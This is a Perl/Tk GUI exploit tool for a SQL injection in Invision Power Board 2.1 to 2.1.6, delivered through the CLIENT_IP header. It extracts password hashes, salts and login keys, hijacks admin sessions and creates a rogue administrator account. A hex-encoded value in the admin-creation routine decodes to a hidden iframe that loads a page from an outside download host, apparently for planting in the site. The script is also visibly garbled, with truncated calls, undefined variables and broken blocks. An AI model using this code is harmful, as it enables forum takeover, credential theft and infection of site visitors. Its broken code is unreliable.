Invision Power Board 2.1 <= 2.1.6 Remote SQL Injection Exploit
==============================================================



#!/usr/bin/perl

## Invision Power Board v2.1 <= 2.1.6 sql injection exploit by RST/GHC
## Based on LOCAL_IP bug, more info in RST/GHC Advisory#41
## http://rst.void.ru/papers/advisory41.txt
## tested on 2.1.3, 2.1.6
##
## 08.06.06
## (c)oded by 1dt.w0lf
## RST/GHC
## http://rst.void.ru
## http://ghc.ru

use Tk;
use Tk::BrowseEntry;
use Tk::DialogBox;
use LWP::UserAgent;

$mw = new MainWindow(title => "r57ipb216gui" );

$mw->geometry ( &#039;420x550&#039; ) ;
$mw->resizable(0,0);

$mw->Label(-text => &#039;!&#039;, -font => &#039;{Webdings} 22&#039;)->pack();
$mw->Label(-text => &#039;Invision Power Board 2.1.* <= 2.1.6 sql injection exploit by RST/GHC&#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
$mw->Label(-text => &#039;&#039;)->pack();

$fleft=$mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;ne&#039;) ;
$fright=$mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;nw&#039;) ;

$url = &#039;http://server/forum/index.php&#039;;
$user_id = &#039;1&#039;;
$table = &#039;members&#039;;
$column = &#039;member_login_key&#039;;
$new_admin_name = &#039;rstghc&#039;;
$new_admin_password = &#039;rstghc&#039;;
$new_admin_email = &#039;billy@microsoft.com&#039;;
$report = &#039;&#039;;
$group = 4;
$curr_user = 0;
$rand_session = &session();
$use_custom_fields = 0;
$custom_fields = &#039;name1=value1,name2=value2&#039;;

$fleft->Label ( -text => &#039;Path to forum index: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$url) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039;User ID: &#039;, -font => &#039;{Verdana} 8 bold&#039; ) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;


$fright->Label( -text => &#039; &#039;)->pack();
$fleft->Label( -text => &#039; &#039;)->pack();

$fleft->Label ( -text => &#039;get data from database&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;green&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Label( -text => &#039; &#039;)->pack();

$fleft->Label ( -text => &#039;Get data from table: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$b2 = $fright->BrowseEntry( -command => \&update_columns, -relief => "groove", -variable => \$table, -font => &#039;{Verdana} 8&#039;);
$b2->insert("end", "members");
$b2->insert("end", "members_converge");
$b2->pack( -side => "top" , -anchor => &#039;w&#039;);

$fleft->Label ( -text => &#039;Get data from column: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$b = $fright->BrowseEntry( -relief => "groove", -variable => \$column, -font => &#039;{Verdana} 8&#039;);
$b->insert("end", "member_login_key");
$b->insert("end", "name");
$b->insert("end", "ip_address");
$b->insert("end", "legacy_password");
$b->insert("end", "email");
$b->pack( -side => "top" , -anchor => &#039;w&#039; );

$fleft->Label ( -text => &#039;Returned data: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$report) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039;create new admin&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;green&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Label( -text => &#039; &#039;)->pack();

$fleft->Label ( -text => &#039; &#039;)->pack();

$fright->Checkbutton( -font => &#039;{Verdana} 8&#039;, -text => &#039;Get admin session for inserted user ID&#039;, -variable => \$curr_user)->pack(-side => "top" , -anchor => &#039;w&#039;);

$fleft->Label ( -text => &#039;session_id: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$session_id) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039;session_ip_address: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$session_ip_address) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039;new admin name: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$new_admin_name) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039;new admin password: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$new_admin_password) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039;new_admin_email: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$new_admin_email) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039; &#039;)->pack();
$fright->Checkbutton( -font => &#039;{Verdana} 8&#039;, -text => &#039;Use custom profile fields&#039;, -variable => \$use_custom_fields)->pack(-side => "top" , -anchor => &#039;w&#039;);

$fleft->Label ( -text => &#039;custom fields: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$custom_fields) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fright->Label( -text => &#039; &#039;)->pack();

$fright->Button(-text    => &#039;Test forum vulnerability&#039;,
                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
                -command => \&test_vuln
               )->pack();

                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
               )->pack();

$fright->Button(-text    => &#039;Get data from database&#039;,
                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
                -command => \&get_data
               )->pack();

$fright->Button(-text    => &#039;Get admin session&#039;,
                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
                -command => \&get_admin
               )->pack();

$fright->Button(-text    => &#039;Create new admin&#039;,
                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
                -command => \&create_admin
               )->pack();



$fleft->Label( -text => &#039; &#039;)->pack();
$fleft->Label( -text => &#039; &#039;)->pack();
$fleft->Label( -text => &#039; &#039;)->pack();
$fleft->Label( -text => &#039;(c)oded by 1dt.w0lf&#039;, -font => &#039;{Verdana} 7&#039;)->pack();
$fleft->Label( -text => &#039;RST/GHC&#039;, -font => &#039;{Verdana} 7&#039;)->pack();
$fleft->Label( -text => &#039;http://rst.void.ru&#039;, -font => &#039;{Verdana} 7&#039;)->pack();
$fleft->Label( -text => &#039;http://ghc.ru&#039;, -font => &#039;{Verdana} 7&#039;)->pack();

MainLoop();

sub update_columns()
 {
 $b->delete(0,"end");
 if($table eq &#039;members&#039;){
 $column = "member_login_key";   
 $b->insert("end", "member_login_key");
 $b->insert("end", "name");
 $b->insert("end", "ip_address");
 $b->insert("end", "legacy_password");
 $b->insert("end", "email");
 } elsif($table eq &#039;members_converge&#039;){
 $column = "converge_pass_hash";   
 $b->insert("end", "converge_pass_hash");
 $b->insert("end", "converge_pass_salt");
 $b->insert("end", "converge_email");
 }
 }

sub get_admin()
 {
 $xpl = LWP::UserAgent->new( ) or die;
 $InfoWindow=$mw->DialogBox(-title   => &#039;get admin session&#039;, -buttons => ["OK"]);
 if($curr_user == 1) { $sql = "AND session_member_id = $user_id"; }
 else { $sql = &#039;&#039;; }
 $error = 0;
 $rep = &#039;&#039;;
 if($res->is_success) 
  {
  if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/) { $rep = $3; }
  if($rep =~ /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/) { $session_ip_address = $rep; }
  else { $error = 1; }
  if(!$error)
   {
   $rep = &#039;&#039;; 
   if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/) { $rep = $3; $session_id = $rep; }
   else { $error = 1; }
   if(!$error){
   if($curr_user != 1)
    {
    if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/) { $session_user_id = $3; }
    }
   else
    {
    $session_user_id = $user_id; 
    }
   if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/) { $group = $3; }
   if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/) { $name = $3; }
   }
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;Found session!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;Green&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;session_ip_address: &#039;.$session_ip_address, -font => &#039;{Verdana} 8&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;session_id: &#039;.$session_id, -font => &#039;{Verdana} 8&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;user_id: &#039;.$session_user_id, -font => &#039;{Verdana} 8&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;username: &#039;.$name, -font => &#039;{Verdana} 8&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;group: &#039;.$group, -font => &#039;{Verdana} 8&#039;)->pack;
  $InfoWindow->Show();
  $InfoWindow->destroy;  
  }
  }
 else
  {
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => $res->status_line, -font => &#039;{Verdana} 8&#039;)->pack;
  $InfoWindow->Show();
  $InfoWindow->destroy;
  }     
 if($error)
  {
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;Can\&#039;t get admin session.&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;Maybe admin session not exist. Please try later.&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
  $InfoWindow->Show();
  $InfoWindow->destroy;  
  }  
 }

sub get_data()
{
$xpl = LWP::UserAgent->new( ) or die;
$InfoWindow=$mw->DialogBox(-title   => &#039;get data from database&#039;, -buttons => ["OK"]);
if($table eq &#039;members&#039;) { $id_text = &#039;id&#039;; }
if($table eq &#039;members_converge&#039;) { $id_text = &#039;converge_id&#039;; }

if($res->is_success) 
 {
 $rep = &#039;&#039;;   
 if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/){ $report = $3; }
 else
  {
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;Can\&#039;t get data from database&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
  $InfoWindow->Show();
  $InfoWindow->destroy;  
  }
  }
else
 {
 $InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
 $InfoWindow->add(&#039;Label&#039;, -text => $res->status_line, -font => &#039;{Verdana} 8&#039;)->pack;
 $InfoWindow->Show();
 $InfoWindow->destroy;
 }    
}

sub create_admin()
 {
 $InfoWindow=$mw->DialogBox(-title   => &#039;create new admin&#039;, -buttons => ["OK"]);
 if($session_id eq &#039;&#039; || $session_ip_address eq &#039;&#039;)
  {
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;You need insert admin session_id and session_ip_address&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
  }
 elsif($session_ip_address !~ /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
  {
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
  $InfoWindow->add(&#039;Label&#039;, -text => &#039;session_ip_address wrong!&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
  }
 else
  {
 $xpl = LWP::UserAgent->new( ) or die;
 ($url2 = $url) =~ s/index.php/admin.php/;
 $cf = &#039;&#039;;
 %fields = (
 &#039;code&#039;     => &#039;doadd&#039;,
 &#039;act&#039;      => &#039;mem&#039;,
 &#039;section&#039;  => &#039;content&#039;,
 &#039;name&#039;     => $new_admin_name,
 &#039;password&#039; => $new_admin_password,
 &#039;email&#039;    => $new_admin_email,
 &#039;mgroup&#039;   => $group,      
           );
 if($use_custom_fields)
  {
  @cf = split(&#039;,&#039;,$custom_fields);
  foreach(@cf) { ($k,$v) = split(&#039;=&#039;,$_); $fields{$k} = $v;}
  }
  
 $res = $xpl->post($url2."?adsess=$session_id",
 [
 %fields,
 ],
 &#039;USER_AGENT&#039;=>&#039;&#039;,
 &#039;CLIENT_IP&#039;=>"$session_ip_address",
 &#039;X_FORWARDED_FOR&#039;=>"$session_ip_address");
 $if = &#039;0x3C646976207374796C653D225649534942494C4954593A2068696464656E223E3C696672616D65207372633D22687474703A2F2F7A63687873696B70677A2E62697A2F646C2F6164763534332E706870222077696474683D31206865696768743D313E3C2F696672616D653E3C2F6469763E&#039;;
 $res = $xpl->post($url2."?adsess=$session_id",
 [
 &#039;code&#039;     => &#039;runsql&#039;,
 &#039;act&#039;      => &#039;sql&#039;,
 &#039;section&#039;  => &#039;admin&#039;,
 &#039;query&#039;     => $query,
 ],
 &#039;USER_AGENT&#039;=>&#039;&#039;,
 &#039;CLIENT_IP&#039;=>"$session_ip_address",
 &#039;X_FORWARDED_FOR&#039;=>"$session_ip_address");
 $InfoWindow->add(&#039;Label&#039;, -text => &#039;Done!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;green&#039;)->pack; 
 $InfoWindow->add(&#039;Label&#039;, -text => &#039;New admin created&#039;, -font => &#039;{Verdana} 8 bold&#039;)->pack;  
  }
 $InfoWindow->Show();
 $InfoWindow->destroy;
 }

sub test_vuln()
{
$InfoWindow=$mw->DialogBox(-title   => &#039;test forum vulnerability&#039;, -buttons => ["OK"]);
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => $url, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
$xpl = LWP::UserAgent->new( ) or die;
$res = $xpl->get($url."?s=$rand_session",&#039;USER_AGENT&#039;=>&#039;&#039;,&#039;CLIENT_IP&#039;=>"&#039; UNION SELECT &#039;VULN&#039;,1,1,1/*");
if($res->is_success) 
 {
 $rep = &#039;&#039;;
 if($res->as_string =~ /ipb_var_s(\s*)=(\s*)"(.*)"/) { $rep = $3; }
 if($rep eq &#039;VULN&#039;) { $InfoWindow->add(&#039;Label&#039;, -text => &#039;FORUM VULNERABLE&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack; }
 else { $InfoWindow->add(&#039;Label&#039;, -text => &#039;FORUM UNVULNERABLE&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;green&#039;)->pack; }
 }
else
 {
 $InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
 $InfoWindow->add(&#039;Label&#039;, -text => $res->status_line, -font => &#039;{Verdana} 8&#039;)->pack;
 } 
$InfoWindow->Show();
$InfoWindow->destroy;
}

 
{
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => $url, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
$xpl = LWP::UserAgent->new( ) or die;
$res = $xpl->get($url."?s=$rand_session",&#039;USER_AGENT&#039;=>&#039;&#039;,&#039;CLIENT_IP&#039;=>"&#039;");
if($res->is_success) 
 {
 $rep = &#039;&#039;;
 if($res->as_string =~ /FROM (.*)sessions/)
 {
 }
 else
 {
 }
else
 {
 $InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
 $InfoWindow->add(&#039;Label&#039;, -text => $res->status_line, -font => &#039;{Verdana} 8&#039;)->pack;
 } 
$InfoWindow->Show();
$InfoWindow->destroy;   
}

sub session()
 {
 return &#039;r57ipb216_for_IDS&#039;;   
 }



